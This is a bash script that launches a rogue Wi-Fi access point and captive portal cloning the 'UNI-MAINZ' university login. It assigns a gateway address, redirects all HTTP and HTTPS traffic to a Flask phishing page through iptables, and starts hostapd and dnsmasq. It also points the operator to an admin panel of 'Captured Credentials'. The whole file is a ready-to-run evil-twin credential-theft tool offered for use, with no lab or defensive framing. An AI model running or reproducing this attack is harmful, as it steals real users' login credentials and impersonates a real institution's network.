#!/bin/bash

# Rogue Captive Portal - Run Rogue Access Point
# This script starts all services and runs the rogue access point

# Variables
SSID="UNI-MAINZ"
INTERFACE="wlan0"
ETHERNET="eth0"
GATEWAY_IP="192.168.10.1"
DHCP_RANGE_START="192.168.10.10"
DHCP_RANGE_END="192.168.10.100"
FLASK_PORT=8080

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}This script must be run as root${NC}" 
   exit 1
fi

# Function to print status messages
print_status() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_error() {
    echo -e "${RED}[-]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

# Configure network interface
configure_network() {
    print_status "Configuring network interface..."
    
    # Bring down the interface
    ip link set dev $INTERFACE down
    
    # Set interface up
    ip link set dev $INTERFACE up
    
    # Assign static IP
    ip addr flush dev $INTERFACE
    ip addr add $GATEWAY_IP/24 dev $INTERFACE
    ip link set dev $INTERFACE up
    
    print_status "Network interface configured with IP $GATEWAY_IP"
}

# Configure iptables
configure_iptables() {
    print_status "Configuring iptables and IP forwarding..."
    
    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Flush existing rules
    iptables -F
    iptables -t nat -F
    iptables -t mangle -F
    iptables -X
    
    # Allow established connections
    iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
    
    # Allow traffic on loopback
    iptables -A INPUT -i lo -j ACCEPT
    
    # Allow DHCP and DNS
    iptables -A INPUT -p udp --dport 67 -j ACCEPT
    iptables -A INPUT -p udp --dport 53 -j ACCEPT
    iptables -A INPUT -p tcp --dport 53 -j ACCEPT
    
    # Allow HTTP/HTTPS traffic to our Flask app
    iptables -A INPUT -p tcp --dport 80 -j ACCEPT
    iptables -A INPUT -p tcp --dport 443 -j ACCEPT
    iptables -A INPUT -p tcp --dport $FLASK_PORT -j ACCEPT
    
    # Redirect all HTTP traffic to our Flask app
    iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j REDIRECT --to-port $FLASK_PORT
    iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 443 -j REDIRECT --to-port $FLASK_PORT
    
    # NAT for internet access (if you want to provide internet)
    # Uncomment the following line if you want to provide internet access through eth0
    # iptables -t nat -A POSTROUTING -o $ETHERNET -j MASQUERADE
    
    print_status "iptables configured"
}

# Start services
start_services() {
    print_status "Starting services..."
    
    # Start dnsmasq
    systemctl start dnsmasq
    
    # Start hostapd
    systemctl unmask hostapd
    systemctl start hostapd
    
    sleep 2
    
    # Check if services are running
    if systemctl is-active --quiet hostapd; then
        print_status "hostapd is running"
    else
        print_error "hostapd failed to start"
        echo -e "${YELLOW}Checking logs:${NC}"
        journalctl -u hostapd -n 20 --no-pager
        return 1
    fi
    
    if systemctl is-active --quiet dnsmasq; then
        print_status "dnsmasq is running"
    else
        print_error "dnsmasq failed to start"
        echo -e "${YELLOW}Checking logs:${NC}"
        journalctl -u dnsmasq -n 20 --no-pager
        return 1
    fi
    
    return 0
}

# Start Flask application
start_flask() {
    print_status "Starting Flask application..."
    
    SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
    
    # Kill any existing Flask processes
    pkill -f "app.py"
    sleep 1
    
    # Check if venv exists
    if [ ! -d "$SCRIPT_DIR/.venv" ]; then
        print_error "Virtual environment not found!"
        print_error "Please run ./1_install_dependencies.sh first"
        return 1
    fi
    
    # Check if app.py exists
    if [ ! -f "$SCRIPT_DIR/app.py" ]; then
        print_error "app.py not found!"
        return 1
    fi
    
    # Start Flask in background
    cd "$SCRIPT_DIR"
    nohup .venv/bin/python3 app.py > flask.log 2>&1 &
    
    sleep 3
    
    if pgrep -f "app.py" > /dev/null; then
        print_status "Flask application started on port $FLASK_PORT"
        return 0
    else
        print_error "Flask application failed to start"
        echo -e "${YELLOW}Checking logs:${NC}"
        cat flask.log
        return 1
    fi
}

# Display status
show_status() {
    echo ""
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}  Rogue Captive Portal Status${NC}"
    echo -e "${GREEN}========================================${NC}"
    echo -e "SSID: ${YELLOW}$SSID${NC}"
    echo -e "Gateway IP: ${YELLOW}$GATEWAY_IP${NC}"
    echo -e "DHCP Range: ${YELLOW}$DHCP_RANGE_START - $DHCP_RANGE_END${NC}"
    echo -e "Flask Port: ${YELLOW}$FLASK_PORT${NC}"
    echo ""
    echo -e "${GREEN}Services:${NC}"
    systemctl is-active --quiet hostapd && echo -e "  hostapd: ${GREEN}RUNNING${NC}" || echo -e "  hostapd: ${RED}STOPPED${NC}"
    systemctl is-active --quiet dnsmasq && echo -e "  dnsmasq: ${GREEN}RUNNING${NC}" || echo -e "  dnsmasq: ${RED}STOPPED${NC}"
    pgrep -f "app.py" > /dev/null && echo -e "  Flask: ${GREEN}RUNNING${NC}" || echo -e "  Flask: ${RED}STOPPED${NC}"
    echo ""
    echo -e "${GREEN}Admin Panel:${NC} http://$GATEWAY_IP:$FLASK_PORT/admin"
    echo -e "${GREEN}Captured Credentials:${NC} Check the admin panel"
    echo ""
    echo -e "${YELLOW}Press Ctrl+C to stop${NC}"
    echo -e "${GREEN}========================================${NC}"
}

# Cleanup function
cleanup() {
    echo ""
    print_warning "Stopping services..."
    
    systemctl stop hostapd
    systemctl stop dnsmasq
    pkill -f "app.py"
    
    # Restore network
    ip addr flush dev $INTERFACE
    systemctl start NetworkManager
    
    # Flush iptables
    iptables -F
    iptables -t nat -F
    iptables -t mangle -F
    iptables -X
    
    print_status "Cleanup complete"
    exit 0
}

# Trap Ctrl+C
trap cleanup EXIT INT TERM

# Main function
main() {
    echo -e "${GREEN}"
    echo "╔═══════════════════════════════════════╗"
    echo "║   Starting Rogue Access Point         ║"
    echo "║   UNI-MAINZ Login Clone               ║"
    echo "╚═══════════════════════════════════════╝"
    echo -e "${NC}"
    
    # Check if configuration exists
    if [ ! -f /etc/hostapd/hostapd.conf ] || [ ! -f /etc/dnsmasq.conf ]; then
        print_error "Configuration files not found!"
        print_error "Please run ./2_configure_services.sh first"
        exit 1
    fi
    
    configure_network
    configure_iptables
    
    if ! start_services; then
        print_error "Failed to start services"
        cleanup
        exit 1
    fi
    
    if ! start_flask; then
        print_error "Failed to start Flask application"
        cleanup
        exit 1
    fi
    
    show_status
    
    # Keep script running
    while true; do
        sleep 10
    done
}

# Run main function
main
